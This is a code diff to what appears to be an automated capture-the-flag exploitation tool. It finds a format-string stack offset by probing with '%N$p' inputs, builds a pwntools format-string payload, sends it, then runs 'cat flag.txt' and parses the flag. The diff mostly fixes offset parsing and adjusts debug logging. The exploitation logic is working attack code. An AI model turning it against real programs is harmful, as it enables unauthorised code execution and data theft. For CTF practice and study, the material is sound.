@@ -393,13 +393,14 @@ class Against:
             probe = "AAAAAAAZ%" + str(i) + "$p"
             p.sendline(bytes(probe,"utf-8"))
 
-            data = p.recvall(timeout=2).decode().strip("\n")
+            data = p.recvall(timeout=2).decode().strip("\n").split("Z")
             if data[1] == "0x5a41414141414141":
                 offset = i
                 p.close()
                 break
             p.close()
 
+        aegis_log.debug(f"Found stack offset {offset}")
         self.format_exploit = fmtstr_payload(offset, payload_writes, write_size='byte')
 
     def send_exploit(self):
@@ -420,7 +421,8 @@ class Against:
             if self.debug == True:
                 self.process.interactive()
         else:
-            aegis_log.debug(f"Sending format string exploit as {self.format_exploit}")
+            aegis_log.debug(f"Sending format string exploit as {self.format_exploit} {len(self.format_exploit)} {len(self.format_exploit) % 16}")
+
             self.process.sendline(self.format_exploit)
             #if self.has_libc_leak == True:
                 #libc_base = self.recv_libc_leak(self.process, self.leak_function)
@@ -448,7 +450,8 @@ class Against:
             self.process.sendline(b"cat flag.txt")
 
             output = self.process.recvall(timeout=2)
-            aegis_log.debug(f"Recieved output {output}")
+            if self.format_exploit == None:
+                aegis_log.debug(f"Recieved output {output}")
             if b"{" in output and b"}":
                 self.flag = b"{" + output.split(b"{")[1].replace(b" ", b"")
                 self.flag = self.flag.replace(b"\n", b"").split(b"}")[0] + b"}"
